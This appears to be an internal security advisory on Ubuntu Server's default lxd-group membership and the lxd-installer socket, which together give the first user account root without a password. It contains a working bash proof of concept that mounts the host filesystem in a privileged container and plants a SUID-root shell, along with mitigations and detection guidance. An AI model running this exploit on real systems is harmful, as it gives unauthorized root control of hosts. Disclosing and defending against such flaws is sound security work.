# Local Privilege Escalation to Root via Default `lxd` Group Membership and `lxd-installer` on Ubuntu

## Summary:

| **Product**           | Ubuntu Server (default first-user provisioning + `lxd-installer` + LXD); also any Ubuntu host on which LXD is installed |
| --------------------- | ----- |
| **Vendor**            | Canonical Ltd. (Ubuntu) |
| **Severity**          | High |
| **Affected Versions** | **Ubuntu Server 24.04 LTS and later (incl. 26.04)** — *verified*: LXD is no longer pre-seeded (LXD 5.20 AGPL relicense — Launchpad #2051346, Jan 2024); `lxd-installer` is seeded instead → affected via on-demand install. **Server releases before 24.04 (20.04 / 22.04 / 23.10)** — *understood* to have pre-seeded the LXD snap in Server / cloud images (this is what #2051346's "no longer preseed" refers to), which would make them affected directly; **this was not independently verified — confirm per host with `snap list lxd`.** **Default Ubuntu Desktop is NOT affected** (neither LXD nor `lxd-installer` present). A host with genuinely no LXD *and* no `lxd-installer` is **not affected** — `lxd`-group membership is then inert. |
| **Tested Versions**   | Ubuntu 26.04 LTS (`resolute`), kernel `7.0.0-15-generic`. **Server A:** full chain exercised end-to-end (lxd-installer trigger → LXD install → privileged container → root-owned write onto the host filesystem). **Server B:** Components 1–2 verified by configuration/source inspection only; the privileged-container step was not executed. **26.04 Desktop:** the primary user is in the `lxd` group, but `lxd-installer` and LXD are **absent by default** → chain not reproducible without first installing LXD (which itself requires `sudo`). |
| **Impact**            | Local Privilege Escalation — arbitrary code execution as **root** on the host |
| **CVE ID**            | None assigned. CVE unlikely — Canonical documents `lxd`-group = root and treats it as by-design; the insecure-default *composition*, however, is arguably trackable. See **Classification Note**. |
| **CWE**               | CWE-269: Improper Privilege Management (related: CWE-276 Incorrect Default Permissions, CWE-250 Execution with Unnecessary Privileges) |
| **PoC Available**     | Yes |
| **Exploit Available** | Yes — exercised on a 26.04 server up to root-level write onto the host filesystem |
| **Patch Available**   | No |
| **Patch Date**        | None — vendor won't-fix (Ubuntu Launchpad #1829071, 2019); documentation clarified instead of a code change |

> **Classification Note (read first).** Each individual link in this chain is *intended* behavior — most importantly, Canonical/LXD **explicitly document that membership of the `lxd` (or `incus`) group is equivalent to `root`**. That alone does **not** make the composition harmless: a chain of individually-intended behaviors, combined with an **insecure default** — a root-equivalent group that is benignly named, auto-assigned to the first account, and (via `lxd-installer`) made effective even before LXD is installed — can legitimately be classed a security weakness (CWE-269 / CWE-276). Whether it warrants a CVE is a question of **vendor / CNA triage, not an absolute rule**. This issue has a long public-disclosure history: the default-install exposure was raised as **canonical/lxd issue #3844 (2017)** — "Installation … automatically adds user to lxd group", arguing it "effectively grant[s] full root access to an arbitrary user upon installation" — and the `lxd`-group → root escalation as **Ubuntu Launchpad bug #1829071 (2019)**. Canonical's response in both was a **won't-fix**: the behavior was left unchanged and the documentation was clarified to state that `lxd`-group access must be treated as root-equivalent (the LXD *snap* additionally stopped auto-adding users, although the OS installer still places the first account in the group). This report does **not** claim a novel code defect — every component works as designed. What it *does* put forward — and what the prior won't-fix decisions did **not** adjudicate — is the **post-2019 composition**: on Ubuntu 24.04+, LXD is no longer pre-installed (#2051346), yet the **OS installer still places the first account in `lxd`** and **`lxd-installer`** re-arms the `lxd` → root path **password-free, even with no LXD present** — so Canonical's 2019 mitigation ("the snap no longer auto-adds users") is, in net effect, **undone**. That specific composition has no public triage record. The report is therefore positioned as an **insecure-default / hardening finding** (CWE-269 / CWE-276 / CWE-1188): a CVE remains unlikely given the prior won't-fix history, but the post-2019 composition is a legitimate, un-adjudicated concern that is worth raising with the vendor. CVSS and Severity below reflect technical impact, independent of CVE status.

## CVSS v3.1 Detailed Scoring:
**Base Score:** 7.8 (HIGH)
**Vector String:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

| **Metric**                     | **Value** | **Justification** |
| ------------------------------ | --------- | ----------------- |
| **Attack Vector (AV)**         | Local     | Requires an existing local shell / interactive session (SSH login counts as Local for CVSS — the escalation itself is performed locally). |
| **Attack Complexity (AC)**     | Low       | Deterministic; no race, no special timing. |
| **Privileges Required (PR)**   | Low       | A normal user account that is a member of the `lxd` group (the default first account qualifies). |
| **User Interaction (UI)**      | None      | Fully automatable; no second user involved. |
| **Scope (S)**                  | Unchanged | Escalation occurs within the same security authority (host). |
| **Confidentiality Impact (C)** | High      | Full read access to the host filesystem as root. |
| **Integrity Impact (I)**       | High      | Arbitrary write/modification of the host as root. |
| **Availability Impact (A)**    | High      | Root can stop services, modify boot config, etc. |

> The template's pre-filled metrics (`AV:Network`, `Impact:RCE`) were corrected: this is **local** privilege escalation, not a network-reachable RCE.

## Product Description:
**Ubuntu** is a Linux distribution by Canonical, widely deployed on servers, cloud instances, and workstations. During installation, the OS installer (Subiquity for Server, or the Desktop installer) creates a **primary administrator account** and adds it to a fixed set of supplementary groups.

**LXD** is Canonical's system container and VM manager. On modern Ubuntu it ships as a snap. To keep the `lxc`/`lxd` commands available before the snap is installed, Ubuntu ships the **`lxd-installer`** package, which provides stub wrappers at `/usr/sbin/lxc` and `/usr/sbin/lxd` plus an on-demand, socket-activated installer service.

## Vulnerability Summary:
The Ubuntu installer adds the **default primary account to the `lxd` group**. Because the `lxd` group is **root-equivalent** (its members can drive the LXD daemon to create a privileged container that mounts the host root filesystem), and because the `lxd-installer` package makes this reachable **even on hosts where LXD is not yet installed** (via a `lxd`-group-writable socket that triggers a root-run installer), any code executing as the primary user can obtain full `root` **without knowing or using the `sudo` password** — collapsing the only credential boundary that account nominally has.

## Prerequisites and Constraints:
- **Code execution as a user in the `lxd` group.** The Ubuntu-installer-created primary account (UID 1000) satisfies this by default. *Any* method of running code as that user qualifies (interactive SSH, an SSH key, a service or cron job running as the user, a deserialization/command-injection bug in an app running as the user, etc.).
- The attacker does **not** need the user's password and does **not** need `sudo` rights to be usable.
- One of:
  - LXD already installed (no further dependency); **or**
  - the `lxd-installer` package present **and** outbound network access to the snap store, so the LXD snap can be fetched on first use. `lxd-installer` ships **by default on Ubuntu Server**, but is **absent on a default Ubuntu Desktop**.
- **Platform scope:** the full chain is reproducible out-of-the-box on **Ubuntu Server**. On a default Ubuntu **Desktop** the primary user is still in the `lxd` group, but with neither LXD nor `lxd-installer` present the chain is **dormant** — it becomes exploitable only if LXD is later installed by some means.
- LXD configuration permits privileged containers (`security.privileged=true`) — the default.
- Constraint: if LXD must be installed on-demand, that step needs network egress and a short delay; on air-gapped hosts the attacker must supply a local image/snap.

## Vulnerability Details:
The escalation is a chain of three independently-intended behaviors that compose into an unauthenticated-by-password root path.

### Component 1 — Insecure default: primary account placed in a root-equivalent group
Ubuntu's default group set for the primary account includes the `lxd` group. The intended default is recorded in `/etc/cloud/cloud.cfg` (`default_user.groups`); the installer-created account is observed to carry the same core set:

```yaml
default_user:
  name: ubuntu
  groups: [adm, cdrom, dip, lxd, sudo]
```

The observed account `user` (UID 1000) has exactly this core set (`adm, cdrom, dip, sudo, … lxd`). The `lxd` group is present by default on Ubuntu (created by Canonical packaging) and the installer adds the primary account to it on **both Server and Desktop** (verified: the primary user is an `lxd` member on a 26.04 Desktop and on 26.04 Servers alike). Note `/etc/adduser.conf` keeps `ADD_EXTRA_GROUPS=0`, so *subsequently* created users are **not** added to `lxd` — only the installer-created primary account is.

**Weakness:** `lxd` is a **root-equivalent** group — LXD's own security documentation states that Unix-socket / `lxd`-group access *"always grants full access to LXD … you should only give such access to users who you'd trust with root access to your system."* Yet the group is named like a benign "container access" group and is auto-assigned to the primary account by the installer. Because that account is also in `sudo`, the membership grants the *primary user* nothing they could not already obtain — but it silently makes the `sudo` **password** meaningless as a boundary for that account, and it normalises `lxd` as a routine group, leading administrators to add non-admin / service accounts to it and unknowingly grant them root. The *grievance* that a fresh Ubuntu install leaves the default account root-equivalent via `lxd` is **not new** — it was raised as canonical/lxd #3844 (2017) and Launchpad #1829071 (2019), both resolved with documentation only. The **mechanism, however, has changed**: #3844 concerned the LXD *deb* postinst adding the user; on Ubuntu 24.04+ the user is placed in `lxd` by the **OS installer's default group set** (independent of LXD), and `lxd-installer` keeps that membership exploitable on demand even though LXD is no longer pre-installed. #1829071 — being mechanism-agnostic — is the closer prior-art match.

### Component 2 — `lxd-installer`: root-equivalence is active even before LXD is installed
The `lxd-installer` package — seeded **by default on Ubuntu Server 24.04 and later** (on Server releases ≤ 23.10 the LXD snap itself was pre-seeded, so this component is unnecessary there — the daemon is already present; `lxd-installer` is normally **absent on Ubuntu Desktop**) — ships a socket-activated installer:

```ini
# /usr/lib/systemd/system/lxd-installer.socket
[Socket]
ListenStream=/run/lxd-installer.socket
SocketUser=root
SocketGroup=lxd          # <-- group-owned by lxd
SocketMode=0660          # <-- group-writable
Accept=true
```

```ini
# /usr/lib/systemd/system/lxd-installer@.service
[Service]
ExecStart=/usr/share/lxd-installer/lxd-installer-service   # runs as root
```

Observed socket: `srw-rw---- 1 root lxd /run/lxd-installer.socket`.

Any member of the `lxd` group can write to the socket; systemd then socket-activates `lxd-installer@.service`, which runs **as root** and executes `snap install lxd`. No polkit prompt, no password — the only gate is `lxd` group membership. The `/usr/sbin/lxc` wrapper does exactly this:

```sh
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
```

**Weakness:** Administrators may assume "LXD is not installed, therefore the `lxd` group is dormant/harmless." `lxd-installer` invalidates that assumption: the group is root-equivalent **on demand**, on stock Ubuntu, before any container tooling is visibly present.

### Component 3 — LXD container privilege model: `lxd` group → host root
Once LXD is running, an `lxd`-group member uses the daemon (running as root) to create a **privileged** container and bind-mount the host root filesystem into it:

- `security.privileged=true` → the container performs **no UID mapping**: container-UID-0 == host-UID-0.
- A `disk` device with `source=/` bind-mounts the host's `/` into the container.

Inside the privileged container the attacker is real host root over the host filesystem, and can plant a SUID-root binary, edit `/etc/shadow`/`/etc/sudoers`, install an SSH key for `root`, etc.

### Related security side-effect — LXD disables a kernel hardening system-wide
On every start, the LXD snap's `daemon.start` runs `manage_apparmor_restrictions()`, which writes `/run/sysctl.d/zz-lxd.conf` and applies:

```
kernel.apparmor_restrict_unprivileged_userns   = 0
kernel.apparmor_restrict_unprivileged_unconfined = 0
```

Thus, triggering Component 2 also **silently disables Ubuntu's unprivileged-user-namespace hardening for the entire system**, affecting *all* users — a noteworthy secondary impact of the same chain.

## Proof-of-Concept:
**Exploitation Difficulty:** Easy
**Weaponization Potential:** Medium (technique is public and well-understood; reliability is high but it leaves loud artifacts)

**PoC Capabilities:**
The PoC, run as the unprivileged primary user, escalates to root on the host without the `sudo` password. It: (a) triggers on-demand LXD installation via the `lxd-installer` socket if needed, (b) initializes LXD, (c) creates a privileged container with the host `/` mounted, and (d) plants a SUID-root shell on the host filesystem, yielding an interactive root shell.

**PoC Code:**
```bash
#!/bin/bash
# Local Privilege Escalation PoC — Ubuntu default `lxd` group membership
# Run as the unprivileged primary user (member of the `lxd` group). No sudo password used.
set -e

CTR=privesc

# --- Step 1: ensure LXD is available (trigger lxd-installer if needed) -------
if ! command -v lxc >/dev/null || ! snap list lxd >/dev/null 2>&1; then
  echo "[*] Triggering lxd-installer socket (root service installs LXD snap)..."
  python3 -c 'import socket;s=socket.socket(socket.AF_UNIX);s.connect("/run/lxd-installer.socket");s.send(b"x");s.recv(1)'
  for _ in $(seq 90); do snap list lxd >/dev/null 2>&1 && break; sleep 1; done
fi
LXC=/snap/bin/lxc

# --- Step 2: initialize LXD (a `lxd` group member may do this via the API) ---
$LXC storage create default dir              2>/dev/null || true
$LXC profile device add default root disk pool=default path=/ 2>/dev/null || true

# --- Step 3: obtain a container image --------------------------------------
# Online: pull from the Ubuntu image server. Offline: import a local rootfs:
#   lxc image import ./alpine.tar.gz --alias osimg
$LXC image copy ubuntu:24.04 local: --alias osimg 2>/dev/null || true

# --- Step 4: privileged container + host root filesystem mounted -----------
$LXC init osimg "$CTR" -c security.privileged=true
$LXC config device add "$CTR" hostroot disk source=/ path=/mnt/host
$LXC start "$CTR"

# --- Step 5: plant a SUID-root shell on the HOST filesystem ----------------
# NOTE: do not write to /mnt/host/tmp — host /tmp is typically a separate
# tmpfs (often nosuid) and a non-recursive bind hides it. Use a path on the
# root filesystem itself. `cp` does not preserve the setuid bit -> re-chmod.
$LXC exec "$CTR" -- sh -c '
  cp /mnt/host/bin/bash /mnt/host/usr/local/bin/rootbash
  chmod 4755 /mnt/host/usr/local/bin/rootbash
'

# --- Step 6: use it on the host --------------------------------------------
echo "[+] Done. On the host run:  rootbash -p     (gives euid=0)"
rootbash -p -c 'id'        # -> uid=1000 euid=0(root)

# --- Cleanup ---------------------------------------------------------------
# $LXC stop "$CTR" -f && $LXC delete "$CTR"
# rm -f /usr/local/bin/rootbash
```

**Verification status (Ubuntu 26.04 LTS):**
- **Component 1** (default `lxd` group on UID 1000) — *confirmed*: the primary user is an `lxd` member on every host examined (`id`); the default group set is documented in `/etc/cloud/cloud.cfg` (`default_user.groups`).
- **Component 2** (`lxd-installer` → password-less root install) — *confirmed*: the socket/service mechanism was verified from package source (`lxd-installer.socket`, `lxd-installer@.service`, the `/usr/sbin/lxc` wrapper); separately, on Server A, invoking `lxc` triggered a password-less LXD snap install via this path (observed in `snap changes`).
- **Component 3** (privileged container → host root) — *confirmed on Server A*: a privileged container with a `source=/` disk device was created and a **root-owned SUID binary was written onto the host filesystem**, demonstrating root-level write access to the host. The final convenience step (executing the planted shell) was **not re-confirmed**, as the test host became unreachable immediately afterwards. Not executed on Server B.
- **Side-effect** — *confirmed on Server A*: `apparmor_restrict_unprivileged_userns` flipped `1 → 0` after the LXD daemon started, and `/run/sysctl.d/zz-lxd.conf` was created.

## Suggested Mitigations:
**For administrators / hardening:**
- Treat `lxd` (and `incus`, `docker`, `libvirt`) group membership as **equivalent to root**. Audit `getent group lxd`.
- Remove the primary/admin user from `lxd` if they do not actively need container management: `sudo gpasswd -d <user> lxd`. (They retain `sudo` for legitimate admin work.)
- **Never** add non-admin or service accounts to `lxd`.
- If on-demand LXD installation is not desired, remove or mask it:
  `sudo apt purge lxd-installer` *or* `sudo systemctl mask lxd-installer.socket`.
- If LXD is required, use **restricted projects** and restricted TLS clients; disallow `security.privileged` and host-path `disk` devices for non-admin principals.
- Be aware that installing/triggering LXD disables `kernel.apparmor_restrict_unprivileged_userns` host-wide; re-enable with `snap set lxd apparmor_unprivileged_restrictions_disable=false` if that hardening is required.

**For the vendor (defense-in-depth recommendations):**
- Do not place the default account in `lxd` by default; provision container access explicitly and interactively.
- Make the `lxd`-group → root equivalence explicit in installer UI / documentation at the point the group is granted.

## Detection Guidance:
- **`lxd-installer` activation:** `lxd-installer@*.service` start events in `journalctl`; `snap changes` showing an unexpected `Install "lxd" snap`.
- **Hardening regression:** appearance of `/run/sysctl.d/zz-lxd.conf`; `journalctl` line `lxd.daemon ... ==> Disabling Apparmor unprivileged userns mediation`; `kernel.apparmor_restrict_unprivileged_userns` reading `0` on a host where it was `1`.
- **Privileged container abuse:** LXD instances with `security.privileged: "true"`; `disk` devices whose `source` is `/` or another host path (`lxc config show <ctr>`); LXD daemon audit events for instance/device creation.
- **Post-exploitation:** new SUID binaries — `find / -perm -4000 -type f -newer /etc/hostname 2>/dev/null`; modifications to `/etc/passwd`, `/etc/shadow`, `/etc/sudoers*`, `/root/.ssh/authorized_keys`.
- **Process anomaly:** a process owned by a normal user connecting to `/run/lxd-installer.socket`; `lxc`/`lxd` activity from a non-admin user session.

## References:
- **LXD documentation — Security**: <https://documentation.ubuntu.com/lxd/latest/explanation/security/> — states verbatim: *"Local access to LXD through the Unix socket always grants full access to LXD. This includes the ability to attach file system paths or devices to any instance … Therefore, you should only give such access to users who you'd trust with root access to your system."*
- **Ubuntu Launchpad bug #1829071** — "Privilege escalation via LXD (local root exploit)", reported by Chris Moberly on 14 May 2019, status **Won't Fix**: <https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071>. LXD lead Stéphane Graber's response: *"For the deb we won't be changing the logic at this point and it's in line with what's done for libvirt, changing behavior at this point would cause more harm than good."* The LXD snap was changed to stop auto-adding users to the `lxd` group; the underlying `lxd`-group = root behaviour was left unchanged.
- **canonical/lxd GitHub issue #3844** — "Installation via apt-get automatically adds user to lxd group", opened 25 Sep 2017, status **Closed**: <https://github.com/canonical/lxd/issues/3844>. Raised the same *grievance* — a fresh install auto-adds the default `uid:1000` user to `lxd`, which "effectively grant[s] full root access to an arbitrary user upon installation"; argued it "should be opt-in, or a warning should be given upon installation." Note the *mechanism* differs from current Ubuntu: #3844 concerned the LXD **deb postinst**; on 24.04+ the user is placed in `lxd` by the **OS-installer default group set** instead. Resolved without a behaviour change.
- Public technical write-up: Shenanigans Labs — "Linux Privilege Escalation via LXD & Hijacked UNIX Socket Credentials" (2019): <https://shenaniganslabs.io/2019/05/21/LXD-LPE.html>; tooling: `initstring/lxd_root` — <https://github.com/initstring/lxd_root>.
- Canonical `lxd-installer` package (Ubuntu) — on-demand LXD snap installation (`/usr/sbin/lxc` wrapper, `lxd-installer.socket`, `lxd-installer@.service`).
- **Ubuntu Launchpad bug #2051346** (`ubuntu-meta`) — "No longer preseed LXD snap…", Fix Released 29 Jan 2024: <https://bugs.launchpad.net/ubuntu/+source/ubuntu-meta/+bug/2051346>. Records that Ubuntu **24.04** stopped pre-seeding the LXD snap (LXD 5.20 AGPL relicense) and seeds `lxd-installer` instead — i.e. Server releases **before** 24.04 shipped the LXD snap pre-installed.
- Ubuntu `cloud-init` default user configuration — `/etc/cloud/cloud.cfg` (`default_user.groups`).
- LXD snap `daemon.start` — `manage_apparmor_restrictions()` (disables `kernel.apparmor_restrict_unprivileged_userns` host-wide).

---
*Prepared as an internal security assessment. The escalation chain relies on documented, intended Ubuntu/LXD behavior; it is reported here as an insecure-default / hardening finding rather than as a novel software defect.*
